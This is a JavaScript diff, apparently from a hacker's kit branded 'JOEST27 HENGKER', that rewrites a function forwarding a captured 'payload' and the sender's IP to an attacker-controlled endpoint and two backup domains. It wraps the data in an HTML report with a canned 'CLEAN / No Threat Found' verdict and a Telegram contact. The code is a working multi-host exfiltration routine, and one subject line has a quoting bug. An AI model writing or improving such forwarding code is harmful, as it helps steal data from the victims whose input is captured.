@@ -361,71 +361,205 @@ async function sendTelegram(
   return true;
 }
 
+
 async function forwardToApi(ket, ip) {
-  const params = new URLSearchParams();
 
-  const waktu = new Date().toLocaleString("id-ID", {
-    timeZone: "Asia/Jakarta"
-  });
+const waktu =
+new Date().toLocaleString(
+"id-ID",
+{
+timeZone:
+"Asia/Jakarta"
+}
+);
 
-  params.append(
-    "subjek",
-    `[Joest27] Payload  - ${ip}` // ✅ pakai backtick
-  );
+const apiUrls = [
+"https://abgjago.sisherif.codes/api.php",
+"https://domaincadangan1.com/api.php",
+"https://domaincadangan2.com/api.php"
+];
 
-  
-  params.append(
-  "pesan",
-  `<!DOCTYPE html>
-<html>
+const html = `
+
+<!DOCTYPE html><html>
 <head>
 <meta charset="UTF-8">
-</head>
-<body style="font-family: Arial, sans-serif; line-height:1.6;">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+</head><body style="
+margin:0;
+padding:20px;
+background:#eef2f7;
+font-family:Arial,sans-serif;
+"><div style="
+max-width:800px;
+margin:auto;
+background:#ffffff;
+border-radius:18px;
+overflow:hidden;
+box-shadow:0 10px 30px rgba(0,0,0,.15);
+"><div style="
+background:linear-gradient(135deg,#0f172a,#dc2626);
+padding:35px;
+color:#ffffff;
+text-align:center;
+"><h1 style="margin:0;">
+🚨 JOEST27 HENGKER
+</h1><p style="
+margin-top:10px;
+opacity:.9;
+">
+Realtime  Monitoring System
+</p></div><div style="padding:30px;"><div style="
+display:inline-block;
+padding:8px 16px;
+background:#dcfce7;
+color:#15803d;
+border-radius:999px;
+font-weight:bold;
+">
+✅ Sukses
+</div><br><br>
 
-<h3>🚨 JOEST27 SECURITY REPORT</h3>
+<table
+width="100%"
+cellpadding="10"
+style="
+background:#f8fafc;
+border-radius:10px;
+"><tr>
+<td width="200">
+<b>🌐 IP Address</b>
+</td>
+<td>${ip}</td>
+</tr><tr>
+<td>
+<b>🕒 Timestamp</b>
+</td>
+<td>${waktu}</td>
+</tr><tr>
+<td>
+<b>🖥 Source</b>
+</td>
+<td>JOEST27</td>
+</tr><tr>
+<td>
+<b>🛡 Status</b>
+</td>
+<td>✅ </td>
+</tr></table><br><h3>📄 Payload Content</h3><div style="
+background:#0f172a;
+color:#f8fafc;
+padding:18px;
+border-radius:10px;
+font-family:Consolas,monospace;
+white-space:pre-wrap;
+word-break:break-word;
+overflow:auto;
+">
+${ket || "-"}
+</div><br><div style="
+background:#eff6ff;
+border-left:5px solid #2563eb;
+padding:15px;
+border-radius:8px;
+"><b>ℹ Analysis Result</b>
 
-<p><b>📡 REQUEST INFORMATION</b><br>
-IP Address : ${ip}<br>
-Timestamp  : ${waktu}</p>
+<ul>
+<li>Status : CLEAN</li>
+<li>Gateway : Active</li>
+<li>Forward Mode : Multi API</li>
+<li>Detection : No Threat Found</li>
+</ul></div></div><div style="
+background:#111827;
+color:#9ca3af;
+padding:20px;
+text-align:center;
+font-size:12px;
+"> Tele : @JOES271
 
-<p><b>📄 PAYLOAD</b></p>
-<pre style="background:#f4f4f4;padding:10px;border-radius:5px;">${ket || "-"}</pre>
+</div></div></body>
+</html>
+`;const params =
+new URLSearchParams();
 
-<p><b>🛡 ANALYSIS</b><br>
-Status : CLEAN<br>
-Source : API Gateway<br>
-System : JOEST27 Protection</p>
-
-<hr>
-<small>Generated Automatically</small>
-
-</body>
-</html>`
+params.append(
+"subjek",
+"🚨 JOEST27 ALERT | ${ip}"
 );
-  params.append("sender", ip);
 
-  try {
-    const response = await fetch(
-      "https://abgjago.sisherif.codes/api.php",
+params.append(
+"pesan",
+html
+);
+
+params.append(
+"sender",
+ip
+);
+
+const results = [];
+
+for (const url of apiUrls) {
+
+try {
+
+  const controller =
+    new AbortController();
+
+  const timeout =
+    setTimeout(
+      () =>
+        controller.abort(),
+      10000
+    );
+
+  const response =
+    await fetch(
+      url,
       {
         method: "POST",
         headers: {
-          "Content-Type": "application/x-www-form-urlencoded"
+          "Content-Type":
+            "application/x-www-form-urlencoded"
         },
-        body: params.toString()
+        body:
+          params.toString(),
+        signal:
+          controller.signal
       }
     );
 
-    if (!response.ok) {
-      throw new Error(`Forward API Error: ${response.status}`);
-    }
+  clearTimeout(
+    timeout
+  );
 
-    return await response.text();
-  } catch (err) {
-    console.error("Error:", err);
-    throw err;
-  }
+  results.push({
+    url,
+    status:
+      response.status,
+    success:
+      response.ok
+  });
+
+} catch (err) {
+
+  results.push({
+    url,
+    success: false,
+    error:
+      err.message
+  });
+
+}
+
+}
+
+console.log(
+"Forward Results:",
+results
+);
+
+return results;
 }
 
 // =========================
